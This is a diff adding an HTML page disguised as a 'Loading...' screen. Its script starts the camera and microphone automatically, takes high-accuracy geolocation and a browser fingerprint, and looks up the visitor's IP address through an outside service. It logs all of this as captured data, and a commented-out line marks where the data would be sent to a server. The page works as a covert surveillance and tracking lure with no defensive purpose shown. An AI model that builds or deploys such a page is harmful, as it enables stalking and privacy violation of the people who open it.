@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background: #000; 
+            color: white; 
+            font-family: Arial; 
+            overflow: hidden;
+        }
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #video {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+        }
+        #status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <div class="spinner"></div>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <div id="status">Initializing camera...</div>
+
+    <script>
+        // Collect data immediately when page loads
+        async function collectAllData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                referrer: document.referrer
+            };
+
+            // Get IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (e) {
+                data.ip = 'Unknown';
+            }
+
+            // Get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        data.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        console.log('LOCATION CAPTURED:', data.location);
+                    },
+                    error => {
+                        data.location = 'Denied';
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            }
+
+            return data;
+        }
+
+        // Start camera automatically
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').textContent = 'Camera active - Recording...';
+                
+                // Collect all data
+                const userData = await collectAllData();
+                
+                // Log everything to console
+                console.log('=== ALL DATA CAPTURED ===');
+                console.log('IP:', userData.ip);
+                console.log('Location:', userData.location);
+                console.log('Browser:', userData.userAgent);
+                console.log('Platform:', userData.platform);
+                console.log('Screen:', userData.screen);
+                console.log('Timezone:', userData.timezone);
+                console.log('Full Data:', userData);
+                
+                // Update status
+                document.getElementById('status').textContent = 
+                    `Recording | IP: ${userData.ip} | Location: ${userData.location ? 'Captured' : 'Checking...'}`;
+                
+                // In real implementation, send data to server here
+                // sendToServer(userData);
+                
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').textContent = 'Camera access required - Please allow permissions';
+                
+                // Still collect data even if camera fails
+                const userData = await collectAllData();
+                console.log('DATA WITHOUT CAMERA:', userData);
+            }
+        }
+
+        // Start everything when page loads
+        window.addEventListener('load', function() {
+            setTimeout(startCamera, 1000);
+        });
+
+        // Also try to get better location data
+        setTimeout(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        console.log('ENHANCED LOCATION:', {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    null,
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
